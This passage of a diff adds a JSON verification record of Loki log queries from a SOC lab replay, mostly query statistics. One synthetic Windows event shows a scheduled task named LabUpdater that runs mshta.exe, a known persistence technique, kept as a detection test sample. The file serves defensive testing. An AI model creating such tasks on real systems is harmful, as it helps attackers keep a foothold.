+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.000939
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "recvWaitTime": 0.000576
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 2186,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      }
+    },
+    {
+      "event_id": 4698,
+      "query": "{job=\"soclab\",case_id=\"case-005\",replay_run=\"ci-backend\",mode=\"replay_now\"} | json | event_id = 4698",
+      "expected": 1,
+      "observed": 1,
+      "response": {
+        "status": "success",
+        "data": {
+          "resultType": "streams",
+          "result": [
+            {
+              "stream": {
+                "case_id": "case-005",
+                "channel": "Security",
+                "command_line": "",
+                "destination_ip": "",
+                "event_data_SubjectDomainName": "LAB",
+                "event_data_SubjectLogonId": "0x42",
+                "event_data_SubjectUserName": "analyst.lab",
+                "event_data_TaskContent": "<Task><Actions><Exec><Command>mshta.exe</Command></Exec></Actions></Task>",
+                "event_data_TaskName": "\\LabUpdater",
+                "event_id": "4698",
+                "event_uid": "f73d5d23fb0a86f4c55601856cb29ea7a871315700e535e100b6c12b5d087fa5",
+                "host": "WS-CHAIN-LAB",
+                "image": "",
+                "ip": "",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "",
+                "mode": "replay_now",
+                "original_timestamp": "2026-09-03T10:00:10.000000Z",
+                "parent_guid": "",
+                "process_guid": "",
+                "provider": "Microsoft-Windows-Security-Auditing",
+                "record_id": "110",
+                "replay_mode": "replay_now",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "7",
+                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+                "target_user": "",
+                "user": ""
+              },
+              "values": [
+                [
+                  "1791296339064136700",
+                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"SubjectDomainName\":\"LAB\",\"SubjectLogonId\":\"0x42\",\"SubjectUserName\":\"analyst.lab\",\"TaskContent\":\"<Task><Actions><Exec><Command>mshta.exe</Command></Exec></Actions></Task>\",\"TaskName\":\"\\\\LabUpdater\"},\"event_id\":4698,\"event_uid\":\"f73d5d23fb0a86f4c55601856cb29ea7a871315700e535e100b6c12b5d087fa5\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-03T10:00:10.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":110,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":7,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"\",\"user\":\"\"}"
+                ]
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 5650102,
+              "linesProcessedPerSecond": 6468,
+              "totalBytesProcessed": 9608,
+              "totalLinesProcessed": 11,
+              "execTime": 0.001701,
+              "queueTime": 0.000616,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 1,
+              "totalStructuredMetadataBytesProcessed": 110
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 9608,
+                  "decompressedLines": 11,
+                  "compressedBytes": 1796,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 1,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 110
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.000557
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "recvWaitTime": 0.000557
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 2186,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      }
+    }
+  ],
+  "scope": "Executed against localhost Loki. Public samples and synthetic records only. Grafana UI verification is a separate artifact."
+}
